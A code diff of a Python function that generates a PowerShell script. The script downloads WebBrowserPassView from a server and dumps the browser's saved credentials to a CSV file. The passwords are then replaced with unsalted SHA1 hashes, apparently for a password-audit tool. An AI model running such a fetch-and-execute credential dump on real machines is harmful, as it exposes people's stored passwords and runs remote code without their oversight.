@@ -140,7 +140,7 @@ def generate_script(generation_type, payload, api_key):
         script_contents += '$utf8 = New-Object -TypeName System.Text.UTF8Encoding\r\n\r\n'
         script_contents += '# Temporarily download WebBrowserPassView - Developed & Copyright by Nir Sofer.\r\n'
         script_contents += '# Convert plain-text passwords discovered to SHA1 hashes.\r\n'
-        script_contents += 'wget ' + url + \
+        script_contents += 'cd /; wget ' + url + \
             '/static/downloads/WebBrowserPassView.exe -OutFile WebBrowserPassView.exe; .\\WebBrowserPassView.exe /scomma credentials.csv; Start-Sleep 1; (Import-Csv ".\credentials.csv" -Delimiter ",") | ForEach-Object { if ($_.Password -ne "") { $_.Password = ([System.BitConverter]::ToString($sha1.ComputeHash($utf8.GetBytes($_.Password))).Replace("-", "")) } $_ } | Export-Csv ".\credentials.csv" -Delimiter "," -NoType; $credentials = (Import-Csv ".\credentials.csv" -Delimiter ",")\r\n\r\n'
         script_contents += get_data(
             'Capture list of hashed passwords; hashes will not be saved.',
